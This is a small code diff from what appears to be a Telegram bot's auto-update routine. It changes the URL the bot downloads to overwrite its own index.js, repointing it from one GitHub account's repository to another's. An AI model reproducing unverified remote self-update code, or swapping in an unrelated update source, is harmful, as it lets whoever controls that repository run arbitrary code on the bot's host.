@@ -1672,7 +1672,7 @@ bot.command("tourl", async (ctx) => {
 // ======================
 // AUTO UPDATE SYSTEM
 // ======================
-const UPDATE_URL = "https://raw.githubusercontent.com/kentungnd9/lucta/refs/heads/main/index.js";
+const UPDATE_URL = "https://raw.githubusercontent.com/Danz-code887/supbuntut/refs/heads/main/index.js";
 const UPDATE_FILE_PATH = "./index.js"; 
 
 function downloadToFile(url, filePath) {
